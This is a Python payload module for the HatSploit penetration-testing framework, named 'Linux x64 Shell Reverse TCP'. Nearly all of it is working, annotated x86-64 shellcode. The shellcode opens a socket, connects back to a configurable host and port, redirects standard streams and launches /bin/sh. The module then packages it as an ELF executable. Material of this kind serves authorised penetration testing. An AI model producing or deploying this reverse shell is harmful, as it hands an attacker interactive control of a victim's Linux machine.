#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, HatVenom, TCPClient):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Shell Reverse TCP",
        'Payload': "linux/x64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        offsets = {
            'lhost': local_host,
            'lport': local_port
        }

        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x6a\x29"          # pushq  $0x29
            b"\x58"              # pop    %rax
            b"\x99"              # cltd
            b"\x6a\x02"          # pushq  $0x2
            b"\x5f"              # pop    %rdi
            b"\x6a\x01"          # pushq  $0x1
            b"\x5e"              # pop    %rsi
            b"\x0f\x05"          # syscall
            b"\x48\x97"          # xchg   %rax,%rdi
            b"\x48\xb9\x02\x00"  # movabs $0x100007fb3150002,%rcx
            b":lport:port:"      # port
            b":lhost:ip:"        # ip
            b"\x51"              # push   %rcx
            b"\x48\x89\xe6"      # mov    %rsp,%rsi
            b"\x6a\x10"          # pushq  $0x10
            b"\x5a"              # pop    %rdx
            b"\x6a\x2a"          # pushq  $0x2a
            b"\x58"              # pop    %rax
            b"\x0f\x05"          # syscall
            b"\x6a\x03"          # pushq  $0x3
            b"\x5e"              # pop    %rsi
            b"\x48\xff\xce"      # dec    %rsi
            b"\x6a\x21"          # pushq  $0x21
            b"\x58"              # pop    %rax
            b"\x0f\x05"          # syscall
            b"\x75\xf6"          # jne    27 <dup2_loop>
            b"\x6a\x3b"          # pushq  $0x3b
            b"\x58"              # pop    %rax
            b"\x99"              # cltd
            b"\x48\xbb\x2f\x62\x69\x6e\x2f"  # movabs $0x68732f6e69622f,%rbx
            b"\x73\x68\x00"      # [redacted]
            b"\x53"              # push   %rbx
            b"\x48\x89\xe7"      # mov    %rsp,%rdi
            b"\x52"              # push   %rdx
            b"\x57"              # push   %rdi
            b"\x48\x89\xe6"      # mov    %rsp,%rsi
            b"\x0f\x05"          # syscall
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'x64', shellcode, offsets)

        return payload
